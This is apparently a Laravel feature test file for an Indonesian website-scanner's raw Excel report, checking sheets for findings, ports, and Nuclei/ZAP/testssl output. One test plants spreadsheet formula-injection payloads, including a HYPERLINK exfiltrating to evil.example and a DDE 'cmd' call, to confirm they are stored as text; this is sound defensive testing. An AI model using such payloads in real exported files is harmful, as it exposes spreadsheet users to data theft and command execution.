<?php

namespace Tests\Feature;

use App\Enums\ObservationStatus;
use App\Enums\ScanMode;
use App\Enums\ScanTargetStatus;
use App\Models\ScanBatch;
use App\Models\ScanTarget;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Http;
use Illuminate\Testing\TestResponse;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use Tests\Support\FakeNetwork;
use Tests\Support\InteractsWithScanner;
use Tests\TestCase;

/**
 * Laporan mentah: semua pemeriksaan dan temuan dalam Excel tersendiri, terpisah dari template Risk Register.
 */
class RawReportTest extends TestCase
{
    use InteractsWithScanner;
    use RefreshDatabase;

    private const SHEETS = ['Ringkasan', 'Tahap', 'Pemeriksaan', 'Temuan & Bukti', 'Teknologi', 'Port & Layanan', 'Nuclei', 'OWASP ZAP', 'testssl.sh', 'Coverage'];

    protected function setUp(): void
    {
        parent::setUp();

        $this->setUpScanner();
    }

    private function scannedTarget(?ScanBatch $batch = null): ScanTarget
    {
        FakeNetwork::http([
            'https://web.jemberkab.go.id/' => Http::response('<html><head><title>Dinas Contoh</title></head></html>', 200, ['Server' => 'Apache/2.4.41']),
            'http://web.jemberkab.go.id/' => Http::response('<title>Dinas Contoh</title>', 200),
            'https://web.jemberkab.go.id/.env' => Http::response("APP_KEY=base64:rahasia\nDB_PASSWORD=rahasia\n", 200),
        ]);

        $target = $this->scan(batch: $batch);

        // Hasil tool eksternal Mode Standar seperti yang disimpan pemeriksaannya
        $tools = [
            ['service-version', 'Port/Web Service Detection', 'nmap', ['ip' => '93.184.216.34', 'services' => [['port' => 443, 'service' => 'https', 'product' => 'nginx', 'version' => '1.25.3']]]],
            ['nuclei', 'Nuclei', 'nuclei', ['results' => [['template' => 'waf-detect:cloudflare', 'severity' => 'info', 'matched_at' => 'https://web.jemberkab.go.id', 'name' => 'WAF Detection']]]],
            ['zap-passive', 'OWASP ZAP Passive', 'zap', ['alerts' => [['plugin' => '10112', 'name' => 'Session Management Response Identified', 'risk' => 'Informational', 'url' => 'https://web.jemberkab.go.id', 'param' => 'laravel_session', 'evidence' => 'laravel_session']]]],
            ['testssl', 'testssl.sh', 'testssl', ['items' => [['id' => 'TLS1_1', 'finding' => 'offered (deprecated)']]]],
        ];

        foreach ($tools as [$key, $label, $tool, $raw]) {
            $target->observations()->create(['check_key' => $key, 'label' => $label, 'tool' => $tool, 'status' => ObservationStatus::Info, 'summary' => "Hasil {$label}", 'raw' => $raw]);
        }

        return $target->fresh();
    }

    private function workbook(TestResponse $response): Spreadsheet
    {
        return IOFactory::load($response->baseResponse->getFile()->getPathname());
    }

    /**
     * @return list<list<mixed>>
     */
    private function rows(Spreadsheet $workbook, string $sheet): array
    {
        // Nilai asli sel (angka tetap angka), bukan teks terformat
        return array_slice($workbook->getSheetByNameOrThrow($sheet)->toArray(null, true, false), 1);
    }

    /**
     * @return list<mixed>
     */
    private function column(Spreadsheet $workbook, string $sheet, int $index): array
    {
        return array_column($this->rows($workbook, $sheet), $index);
    }

    public function test_laporan_mentah_website_berisi_semua_pemeriksaan_temuan_teknologi_dan_hasil_tool(): void
    {
        $target = $this->scannedTarget();

        $response = $this->get(route('targets.raw-report', $target))
            ->assertOk()
            ->assertDownload('Laporan Mentah SIPRIKA - web.jemberkab.go.id.xlsx');
        $workbook = $this->workbook($response);

        $this->assertSame(self::SHEETS, $workbook->getSheetNames());

        [$summary] = $this->rows($workbook, 'Ringkasan');
        $this->assertSame(['https://web.jemberkab.go.id', 'Standar', 'Selesai'], array_slice($summary, 1, 3));
        $this->assertNotEmpty($summary[4], 'Mulai');
        $this->assertNotEmpty($summary[6], 'Durasi');
        $this->assertSame('Dinas Contoh', $summary[12]);
        $this->assertSame('Apache/2.4.41', $summary[13]);

        // Setiap tahap tercatat dengan jam mulai, jam selesai, dan lamanya
        $steps = $this->rows($workbook, 'Tahap');
        $this->assertCount(count($target->progress), $steps);
        $this->assertSame('Selesai', collect($steps)->firstWhere(2, 'Exposure Detection')[3]);
        $this->assertNotEmpty(collect($steps)->firstWhere(2, 'Exposure Detection')[6]);

        // Semua pemeriksaan, termasuk yang lolos
        $this->assertCount($target->observations()->count(), $this->rows($workbook, 'Pemeriksaan'));
        $this->assertContains(['https://web.jemberkab.go.id', 'HSTS', 'header-hsts', 'Pemeriksaan bawaan', 'FAIL'], array_map(fn ($row) => array_slice($row, 0, 5), $this->rows($workbook, 'Pemeriksaan')));

        // Temuan beserta bukti; isi file rahasia tetap disamarkan
        $findings = $this->rows($workbook, 'Temuan & Bukti');
        $env = collect($findings)->firstWhere(1, 'exposed-sensitive-file');
        $this->assertStringContainsString('/.env', $env[7]);
        $this->assertStringNotContainsString('rahasia', json_encode($findings));

        $this->assertContains(['https://web.jemberkab.go.id', 'Apache HTTP Server', '2.4.41', 'Web Server', 'Pemeriksaan bawaan'], $this->rows($workbook, 'Teknologi'));
        $this->assertSame([['https://web.jemberkab.go.id', '93.184.216.34', 443, 'https', 'nginx', '1.25.3']], $this->rows($workbook, 'Port & Layanan'));
        $this->assertSame(['waf-detect:cloudflare'], $this->column($workbook, 'Nuclei', 1));
        $this->assertSame(['Session Management Response Identified'], $this->column($workbook, 'OWASP ZAP', 1));
        $this->assertSame(['TLS1_1'], $this->column($workbook, 'testssl.sh', 1));

        // Coverage: satu baris per kunci katalog
        $this->assertCount(count(config('siprika_scanner.catalog_coverage')), $this->rows($workbook, 'Coverage'));
    }

    public function test_isi_dari_website_ditulis_sebagai_teks_bukan_rumus(): void
    {
        $target = $this->scannedTarget();
        $formula = '=HYPERLINK("http://evil.example/?"&A1,"Klik")';
        $target->update(['overview' => ['title' => $formula."\x08", 'web_server' => '+cmd|\'/C calc\'!A0'] + $target->overview]);

        $sheet = $this->workbook($this->get(route('targets.raw-report', $target)))->getSheetByNameOrThrow('Ringkasan');

        $this->assertSame($formula, $sheet->getCell('M2')->getValue(), 'Karakter kontrol dibuang, isi tetap teks');
        $this->assertSame(DataType::TYPE_STRING, $sheet->getCell('M2')->getDataType());
        $this->assertSame(DataType::TYPE_STRING, $sheet->getCell('N2')->getDataType());
    }

    public function test_laporan_batch_berisi_semua_website_dan_template_risk_register_tidak_berubah(): void
    {
        $template = config('siprika.excel.template');
        $this->assertFileExists($template);
        $before = md5_file($template);

        $batch = ScanBatch::create(['mode' => ScanMode::Standard]);
        $this->scannedTarget($batch);
        $batch->targets()->create(['position' => 2, 'url' => 'https://tidak-ada.jemberkab.go.id', 'host' => 'tidak-ada.jemberkab.go.id', 'status' => ScanTargetStatus::Failed, 'error_message' => 'Domain tidak ditemukan di DNS.']);

        $response = $this->get(route('scans.raw-report', $batch))
            ->assertOk()
            ->assertDownload("Laporan Mentah SIPRIKA - Batch {$batch->id}.xlsx");
        $workbook = $this->workbook($response);

        $summary = $this->rows($workbook, 'Ringkasan');
        $this->assertSame([1, 2], array_column($summary, 0));
        $this->assertSame(['Selesai', 'Gagal'], array_column($summary, 3));
        $this->assertSame('Domain tidak ditemukan di DNS.', $summary[1][23]);

        // Sheet tanpa data tetap ada supaya susunan laporan selalu sama
        $this->assertSame(self::SHEETS, $workbook->getSheetNames());
        $this->assertSame($before, md5_file($template));
    }

    public function test_tombol_laporan_mentah_tampil_setelah_pemeriksaan_dimulai(): void
    {
        $target = $this->scannedTarget();

        $this->get(route('scans.show', $target->batch))->assertOk()->assertSee(route('scans.raw-report', $target->batch));
        $this->get(route('targets.show', $target))->assertOk()->assertSee(route('targets.raw-report', $target));

        $queued = ScanBatch::create(['mode' => ScanMode::Quick]);
        $waiting = $queued->targets()->create(['position' => 1, 'url' => 'https://web.jemberkab.go.id', 'host' => 'web.jemberkab.go.id']);

        $this->get(route('scans.show', $queued))->assertOk()->assertDontSee(route('scans.raw-report', $queued));
        $this->get(route('targets.show', $waiting))->assertOk()->assertDontSee(route('targets.raw-report', $waiting));
    }
}
